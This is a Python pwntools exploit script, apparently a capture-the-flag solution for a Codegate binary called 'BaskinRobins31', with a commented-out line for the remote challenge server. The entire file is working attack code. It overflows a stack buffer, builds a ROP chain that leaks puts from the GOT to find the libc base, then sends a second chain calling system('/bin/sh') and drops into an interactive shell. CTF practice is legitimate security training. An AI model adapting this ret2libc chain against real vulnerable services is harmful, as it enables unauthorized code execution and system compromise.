from pwn import *

context.arch="amd64"
elf=ELF("./BaskinRobins31")
libc= ELF("./libc.so.6.txt")

p=process("./BaskinRobins31")
#p=remote("ch41l3ng3s.codegate.kr", 3131)

pr=0x400bc2
ppr=0x400bc0
pdr = next(elf.search(asm("pop rdi; ret")))

print p.recv()

gdb.attach(p, "b *0x400979\nc")

p.sendline("A"*0xb8+flat(pdr, elf.got['puts'], elf.plt['puts'], 0x400a4b ))

print p.recvuntil("Don't break the rules...:( \n")
puts= u64(p.recv(6).ljust(8,"\x00"))
libc.address = puts - libc.symbols['puts']
print p.recv()
p.sendline("A"*0xb8+flat(pdr, next(libc.search("/bin/sh\x00")), libc.symbols['system'], 0x400a4b ))

p.interactive()
